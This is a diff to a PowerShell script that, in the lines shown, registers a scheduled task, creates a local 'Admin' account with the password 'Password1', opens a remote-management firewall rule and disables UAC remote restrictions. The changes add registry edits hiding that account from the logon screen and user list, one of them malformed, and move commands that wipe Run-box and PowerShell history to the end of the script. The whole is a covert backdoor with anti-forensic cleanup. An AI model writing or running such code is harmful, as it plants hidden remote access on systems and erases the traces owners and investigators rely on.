@@ -62,12 +62,6 @@ $Task.Settings = $Settings
 # Register the scheduled task
 Register-ScheduledTask -TaskName $TaskName -InputObject $Task -Force
 
-# Delete run box history
-Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -Force
-
-# Delete powershell history
-Remove-Item (Get-PSReadlineOption).HistorySavePath
-
 # Create a new local user account
 $Username = "Admin"
 $Password = ConvertTo-SecureString "Password1" -AsPlainText -Force
@@ -84,4 +78,15 @@ New-NetFirewallRule -DisplayName "Windows Remote Management for RD" -Direction I
 
 # Disable UAC remote restrictions
 Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "LocalAccountTokenFilterPolicy" -Value 1 -Force
+
+# Hide the user "Admin" from the logon screen
 New-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" -Name "Admin" -Value 0 -PropertyType DWORD -Force
+
+# Hide the user "Admin" from the user accounts list
+New-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" -Name "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" -Value 0 -PropertyType DWORD -Force
+
+# Delete run box history
+Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -Force
+
+# Delete powershell history
+Remove-Item (Get-PSReadlineOption).HistorySavePath
